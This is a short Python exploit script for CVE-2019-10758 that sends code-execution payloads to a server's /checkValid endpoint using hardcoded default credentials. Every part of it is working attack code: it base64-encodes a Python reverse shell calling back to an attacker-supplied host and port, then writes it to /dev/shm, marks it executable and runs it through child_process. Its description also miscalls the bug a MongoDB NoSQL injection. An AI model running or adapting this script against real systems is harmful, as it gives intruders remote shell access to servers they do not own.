# CVE-2019-10758 Exploit
# van0

import base64
import requests
import argparse

# Create Argument Parser
parser = argparse.ArgumentParser(description="""
CVE-2019-10758 Exploit Script

This script exploits the CVE-2019-10758 vulnerability, a NoSQL injection vulnerability that affects MongoDB. 
The exploit works by injecting malicious queries into MongoDB, allowing an attacker to perform different actions 
on the server without proper authentication.

This specific script sends a reverse shell payload to a remote server, essentially giving the attacker 
command-line access to the server. It uses Basic Authentication and the reverse shell command is encoded 
in Base64 for obfuscation. The payload is delivered through a series of HTTP POST requests.

Please use this script responsibly and ethically.
""")

parser.add_argument('--lhost', required=True, help="The IP address of your machine (the attacker)")
parser.add_argument('--lport', required=True, help="The port on which your machine is listening for incoming connections")
parser.add_argument('--rhost', required=True, help="The IP address of the remote server (the target)")
parser.add_argument('--rport', required=True, help="The port on which the remote server is running the vulnerable service")

args = parser.parse_args()

username = "admin"
password = "pass"
url = f"http://{args.rhost}:{args.rport}/checkValid"
auth = base64.b64encode(f"{username}:{password}".encode()).decode()

headers = {
    "Authorization": f"Basic {auth}",
}

reverse_shell_cmd = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.lhost}",{args.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\'' 

b64_cmd = base64.b64encode(reverse_shell_cmd.encode()).decode()

payloads = [
    'this.constructor.constructor("return process")().mainModule.require("child_process").exec("echo \'{}\' | base64 -d > /dev/shm/shell.sh")'.format(b64_cmd),
    'this.constructor.constructor("return process")().mainModule.require("child_process").exec("chmod +x /dev/shm/shell.sh")',
    'this.constructor.constructor("return process")().mainModule.require("child_process").exec("/dev/shm/shell.sh &")'
]

for payload in payloads:
    data = {'document': payload}
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        print("Payload sent successfully.")
    else:
        print("Failed to send payload.")

print('watch your listener')